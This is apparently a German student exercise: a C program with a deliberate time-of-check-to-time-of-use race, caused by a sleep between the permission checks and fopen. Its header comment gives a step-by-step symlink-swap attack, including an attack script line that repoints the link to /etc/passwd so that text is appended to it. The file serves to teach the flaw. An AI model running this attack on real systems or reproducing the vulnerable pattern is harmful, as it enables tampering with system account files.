/**
*
* Gruppe:
* Dennis Röllke 108 012 233 235
* Jan Kaiser 108 012 211 505
* Phillip Müller 108 012 236 929
*
* Ziel ist es an allen If-Cases vorbeizukommen. 
* Schafft man es nach der Letzt Zugriffsüberprüfung  einen symbolischen Link einzuschleusen wird die angegeben Datei ungeprüft geöffnet. 
* Das ist hier möglich, da Sleep verwendet wird und der Programmablauf in dem Moment von anderen Prozessen unterbrochen werden kann, 
* dann aber nicht nochmal prüft, sondern, nach dem Sleep weiterläuft.
*
* Der Angrif selbst könnte mit Hilfe eines Shell Scripts geschehen:
* 1. Eine beliebige Datei zB Namens "dummy" erstellen mit „touch dummy“
* 2. Einen Softlink auf "dummy" erstellen mit "ln –s dummy ptr"
* 3. Ein Angriffs Script als parallelen Prozess ausführen mittels Shell Operator "&": ./attack.sh & ./toctou ptr „hello“
* In der attack.sh steht dabei der Befehl zum Ersetzen des Softlinks: "rm ptr; ln -s /etc/passwd ptr"
* 4. Überprüfen ob der Angriff geklappt hat, also das wort "hello" in "passwd" steht mit "tail /etc/passwd"
*
**/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>

int main (int argc, char* argv[])
{
   struct stat st;		
   FILE* fp;

   if (argc != 3) { // Wenn nicht 3 Parameter angegeben
       fprintf (stderr, "usage : %s file message\n", argv[0]);   
       exit(EXIT_FAILURE);
   }
   
   if (stat(argv[1], & st) < 0) { // Wenn Datei nicht existiert
       fprintf (stderr, "Cannot find %s\n", argv[1]);
       exit(EXIT_FAILURE);
   }
   
   if (st.st_uid != getuid()) { // Wenn User nicht Eigner ist (Stichwort: Rechte)
       fprintf (stderr, "Not the owner of %s \n", argv[1]);
       exit(EXIT_FAILURE);
   }
   
   if (! S_ISREG (st.st_mode)) { // Wenn Datei keine Datei ist xD
       fprintf (stderr, "%s is not a normal file\n", argv[1]);
       exit(EXIT_FAILURE);
   }
					// Auffällig !!!
   sleep(1);		// SLEEP, unterbricht den Programmablauf 
					// Hier ist es möglich, dass ein anderer Prozess ausgeführt wird
					// Hier Angreifen
					// Warum wird das hier eigentlich gemacht?
   if ((fp = fopen(argv[1], "a")) == NULL) { // Wenn Datei nicht geöffnet werden kann
       fprintf (stderr, "Cannot open file\n");
       exit(EXIT_FAILURE);
   }
   // Auffällig !!!
   // Wenn keiner der Fälle eintritt
   // Wird direkt in die Datei geschrieben und "Write OK" ausgegeben
   // Man muss also "nur" alle obigen If-Clauses umgehen,
   // Der Schreibzugriff selbst ist offensichtlich nicht geschützt
   fprintf(fp, "%s\n", argv[2]);
   fclose(fp);
   fprintf(stderr, "Write Ok\n");
   exit(EXIT_SUCCESS);
}
